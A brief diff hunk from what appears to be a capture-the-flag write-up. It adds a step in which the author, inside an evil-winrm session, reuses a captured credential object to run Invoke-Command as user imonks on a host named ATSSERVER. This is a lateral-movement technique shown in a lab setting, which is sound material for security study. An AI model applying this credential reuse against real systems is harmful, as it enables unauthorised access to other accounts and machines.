@@ -440,8 +440,15 @@ evil-winrm-py PS C:\Users\edavies\Documents> $cred = New-Object System.Managemen
 Ill create another credential object for `imonks`
 
 ```python
-
+evil-winrm-py PS C:\Users\edavies\Documents> Invoke-Command -ComputerName ATSSERVER -ScriptBlock {whoami} -Credential $cred -ConfigurationName dc_manage
+acute\imonks
 ```
+
+Ill use the credential object to run a command as that user on the ATSSERVER
+
+
+
+
 
 
 
